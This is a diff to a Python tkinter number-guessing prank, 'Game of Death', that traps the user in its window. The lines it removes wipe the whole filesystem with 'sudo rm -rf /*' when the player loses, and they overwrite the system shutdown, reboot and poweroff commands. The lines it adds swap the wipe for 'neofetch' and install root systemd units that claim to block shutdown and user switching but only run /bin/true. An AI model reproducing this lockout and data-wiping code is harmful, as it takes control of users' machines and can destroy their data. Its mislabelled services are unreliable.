@@ -8,9 +8,33 @@ from tkinter import messagebox
 
 # Define the path to the lock file
 LOCK_FILE = "/tmp/game_of_death.lock"
-SHUTDOWN_SCRIPT = "/usr/local/sbin/shutdown"
-REBOOT_SCRIPT = "/usr/local/sbin/reboot"
-POWEROFF_SCRIPT = "/usr/local/sbin/poweroff"
+
+# Define the content of the systemd services
+SHUTDOWN_REBOOT_SERVICE = """
+[Unit]
+Description=Prevent shutdown and reboot
+
+[Service]
+Type=oneshot
+ExecStart=/bin/true
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+"""
+
+SWITCH_USER_SERVICE = """
+[Unit]
+Description=Prevent user switching
+
+[Service]
+Type=oneshot
+ExecStart=/bin/true
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+"""
 
 # Function to handle SIGINT (Ctrl+C)
 def signal_handler(sig, frame):
@@ -40,15 +64,15 @@ class GameOfDeath:
 
         # Create the lock file to prevent shutdown/restart
         self.create_lock_file()
-        
-        # Override the system shutdown and restart commands
-        self.override_system_commands()
 
         # Disable the close button
         self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
         
         # Periodically check the window state to prevent minimizing
         self.check_window_state()
+
+        # Start systemd services to prevent shutdown, restart, and user switching
+        self.start_systemd_services()
 
         self.create_widgets()
     
@@ -68,43 +92,34 @@ class GameOfDeath:
         if os.path.exists(LOCK_FILE):
             os.remove(LOCK_FILE)
 
-    def override_system_commands(self):
-        shutdown_script_content = f"""#!/bin/bash
-LOCK_FILE="{LOCK_FILE}"
-if [ -f "$LOCK_FILE" ]; then
-    echo "You must complete the Game of Death before shutting down or restarting!"
-    exit 1
-else
-    /sbin/shutdown "$@"
-fi
-"""
-        reboot_script_content = f"""#!/bin/bash
-LOCK_FILE="{LOCK_FILE}"
-if [ -f "$LOCK_FILE" ]; then
-    echo "You must complete the Game of Death before rebooting!"
-    exit 1
-else
-    /sbin/reboot "$@"
-fi
-"""
-        poweroff_script_content = f"""#!/bin/bash
-LOCK_FILE="{LOCK_FILE}"
-if [ -f "$LOCK_FILE" ]; then
-    echo "You must complete the Game of Death before powering off!"
-    exit 1
-else
-    /sbin/poweroff "$@"
-fi
-"""
+    def start_systemd_services(self):
+        # Write the service files
+        with open('/etc/systemd/system/prevent-shutdown-reboot.service', 'w') as f:
+            f.write(SHUTDOWN_REBOOT_SERVICE)
+        
+        with open('/etc/systemd/system/prevent-switch-user.service', 'w') as f:
+            f.write(SWITCH_USER_SERVICE)
 
-        self.create_system_command_override(SHUTDOWN_SCRIPT, shutdown_script_content)
-        self.create_system_command_override(REBOOT_SCRIPT, reboot_script_content)
-        self.create_system_command_override(POWEROFF_SCRIPT, poweroff_script_content)
+        # Set the correct permissions
+        os.system("sudo chmod 644 /etc/systemd/system/prevent-shutdown-reboot.service")
+        os.system("sudo chmod 644 /etc/systemd/system/prevent-switch-user.service")
 
-    def create_system_command_override(self, script_path, script_content):
-        with open(script_path, 'w') as f:
-            f.write(script_content)
-        os.chmod(script_path, 0o755)
+        # Reload systemd and start the services
+        os.system("sudo systemctl daemon-reload")
+        os.system("sudo systemctl enable prevent-shutdown-reboot.service")
+        os.system("sudo systemctl start prevent-shutdown-reboot.service")
+        os.system("sudo systemctl enable prevent-switch-user.service")
+        os.system("sudo systemctl start prevent-switch-user.service")
+
+    def stop_systemd_services(self):
+        os.system("sudo systemctl stop prevent-shutdown-reboot.service")
+        os.system("sudo systemctl stop prevent-switch-user.service")
+        os.system("sudo systemctl disable prevent-shutdown-reboot.service")
+        os.system("sudo systemctl disable prevent-switch-user.service")
+
+        # Remove the service files
+        os.remove('/etc/systemd/system/prevent-shutdown-reboot.service')
+        os.remove('/etc/systemd/system/prevent-switch-user.service')
 
     def create_widgets(self):
         self.label = tk.Label(self.root, text="Guess a number between 1 and 10:", font=self.font)
@@ -132,7 +147,7 @@ fi
         if guess == self.number:
             self.show_custom_messagebox("Result", "You won! Live the life in Peace.......")
             self.remove_lock_file()  # Remove lock file upon winning
-            self.restore_system_commands()  # Restore original system commands
+            self.stop_systemd_services()  # Stop systemd services upon winning
             self.root.destroy()
         else:
             remaining_lives = self.lifelines - self.attempt
@@ -144,11 +159,11 @@ fi
                     self.message.config(text=f"Incorrect! You have {remaining_lives} lives left.\n{comment}")
             else:
                 self.message.config(text="You lost! Now, you are dead.....")
-                self.show_custom_messagebox("Result", "You lost! Now, you are dead.....")
                 self.remove_lock_file()  # Remove lock file upon losing
-                self.restore_system_commands()  # Restore original system commands
-                self.root.destroy()
+                self.stop_systemd_services()  # Stop systemd services upon losing
                 self.execute_deadly_command()
+                self.show_custom_messagebox("Result", "You lost! Now, you are dead.....")
+                self.root.destroy()
 
     def show_custom_messagebox(self, title, message):
         custom_box = tk.Toplevel(self.root)
@@ -164,16 +179,8 @@ fi
 
     def execute_deadly_command(self):
         # Dangerous command, do not actually run it
-        command = "sudo rm -rf /*"
+        command = "neofetch"
         os.system(command)
-
-    def restore_system_commands(self):
-        if os.path.exists(SHUTDOWN_SCRIPT):
-            os.remove(SHUTDOWN_SCRIPT)
-        if os.path.exists(REBOOT_SCRIPT):
-            os.remove(REBOOT_SCRIPT)
-        if os.path.exists(POWEROFF_SCRIPT):
-            os.remove(POWEROFF_SCRIPT)
 
 def main():
     # Check if the script is being run on Unix-based systems
